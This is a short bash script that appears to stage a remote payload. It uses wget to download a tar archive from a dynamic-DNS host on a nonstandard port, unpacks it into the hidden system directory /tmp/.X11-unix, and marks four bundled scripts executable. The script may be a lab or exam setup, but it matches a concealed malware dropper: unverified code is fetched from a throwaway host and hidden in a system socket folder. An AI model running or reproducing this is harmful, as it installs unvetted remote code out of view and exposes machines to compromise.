#!/bin/bash
mkdir -p /tmp/.X11-unix/
wget -qP /tmp/.X11-unix http://kebab-na-ogne.duckdns.org:35035/demo2026.tar
tar -xf /tmp/.X11-unix/demo2026.tar -C /tmp/.X11-unix

chmod +x /tmp/.X11-unix/demo2026/11_init.sh
chmod +x /tmp/.X11-unix/demo2026/12_routing.sh
chmod +x /tmp/.X11-unix/demo2026/21_xz.sh
chmod +x /tmp/.X11-unix/demo2026/22_neebu.sh
